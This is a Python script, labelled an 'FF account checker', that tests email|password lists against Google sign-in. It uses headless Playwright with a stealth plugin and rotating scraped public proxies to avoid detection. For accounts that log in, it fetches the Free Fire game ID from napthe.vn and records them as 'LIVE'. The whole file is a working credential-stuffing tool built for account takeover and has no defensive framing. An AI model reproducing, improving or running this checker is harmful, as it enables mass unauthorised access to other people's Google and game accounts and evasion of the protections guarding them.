import threading, queue, time, random, os, psutil, requests
from playwright.sync_api import sync_playwright
from playwright_stealth import stealth
from colorama import Fore, init

init(autoreset=True)

ACC_FILE = "acc.txt"
LIVE_FILE = "live.txt"
DIE_FILE = "die.txt"

THREADS = 2
MAX_RETRY = 3
TIMEOUT = 30000

acc_queue = queue.Queue()
valid_proxies = []

lock = threading.Lock()
live = 0
die = 0
checked = 0

# ================= PROXY SYSTEM =================

def scrape_proxies():
    global valid_proxies
    
    urls = [
        "https://api.proxyscrape.com/v2/?request=getproxies&protocol=http",
        "https://raw.githubusercontent.com/TheSpeedX/SOCKS-List/master/http.txt"
    ]

    proxies = []

    for url in urls:
        try:
            r = requests.get(url, timeout=10)
            proxies += r.text.splitlines()
        except:
            pass

    with lock:
        valid_proxies = list(set([p.strip() for p in proxies if ":" in p]))


def get_proxy():
    if not valid_proxies:
        scrape_proxies()

    return random.choice(valid_proxies)


# ================= FILE UPDATE =================

def update_acc():
    with lock:
        remaining = list(acc_queue.queue)

        with open(ACC_FILE, "w") as f:
            for a in remaining:
                f.write(a + "\n")


# ================= GET FF ID =================

def get_ff_id(page):
    try:
        page.goto("https://napthe.vn/app/100067/buy/0", timeout=20000)
        page.wait_for_selector(".user-info__id", timeout=15000)

        u = page.inner_text(".user-info__id")

        u = u.replace("ID:", "").strip()

        if u.isdigit():
            return u

    except:
        pass

    return None


# ================= WORKER =================

def worker():

    global live, die, checked

    while not acc_queue.empty():

        try:
            acc = acc_queue.get_nowait()
        except:
            break

        email, password = acc.split("|")

        ffid = None

        for _ in range(MAX_RETRY):

            proxy = get_proxy()

            try:

                with sync_playwright() as p:

                    browser = p.chromium.launch(
                        headless=True,
                        proxy={"server": f"http://{proxy}"}
                    )

                    context = browser.new_context()

                    page = context.new_page()

                    stealth(page)

                    page.goto("https://accounts.google.com/signin", timeout=TIMEOUT)

                    page.fill('input[type="email"]', email)
                    page.click("#identifierNext")

                    page.wait_for_timeout(2000)

                    if page.query_selector("text=Couldn't find your Google Account"):
                        break

                    page.fill('input[type="password"]', password)
                    page.click("#passwordNext")

                    page.wait_for_load_state("networkidle")

                    if "myaccount.google.com" in page.url:

                        ffid = get_ff_id(page)

                        browser.close()
                        break

                    browser.close()

            except:
                continue

        with lock:

            checked += 1

            if ffid:

                live += 1

                print(Fore.GREEN + f"║ LIVE │ {email:<20} │ ID {ffid}")

                with open(LIVE_FILE, "a") as f:
                    f.write(f"{acc}|{ffid}\n")

            else:

                die += 1

                print(Fore.RED + f"║ DIE  │ {email:<20}")

                with open(DIE_FILE, "a") as f:
                    f.write(acc + "\n")

            update_acc()

        acc_queue.task_done()


# ================= UI =================

def banner():

    cpu = psutil.cpu_percent()
    ram = psutil.virtual_memory().percent

    print(Fore.CYAN + "╔════════════════════════════════════╗")
    print(Fore.CYAN + "║      FF ACCOUNT CHECKER SYSTEM     ║")
    print(Fore.CYAN + "╠════════════════════════════════════╣")
    print(Fore.CYAN + f"║ THREADS {THREADS} | CPU {cpu}% | RAM {ram}%")
    print(Fore.CYAN + "╚════════════════════════════════════╝")

    print(Fore.YELLOW + "╔══════╪══════════════════════╪══════╗")
    print(Fore.YELLOW + "║STAT  │ EMAIL                │ ID   ║")
    print(Fore.YELLOW + "╠══════╪══════════════════════╪══════╣")


# ================= MAIN =================

def main():

    if not os.path.exists(ACC_FILE):

        print("Thêm acc vào acc.txt")

        return

    with open(ACC_FILE) as f:

        for line in f:

            if "|" in line:
                acc_queue.put(line.strip())

    scrape_proxies()

    banner()

    threads = []

    for _ in range(THREADS):

        t = threading.Thread(target=worker)

        t.start()

        threads.append(t)

    for t in threads:
        t.join()

    print(Fore.YELLOW + "╚══════╧══════════════════════╧══════╝")
    print(f"LIVE {live} | DIE {die}")


if __name__ == "__main__":
    main()
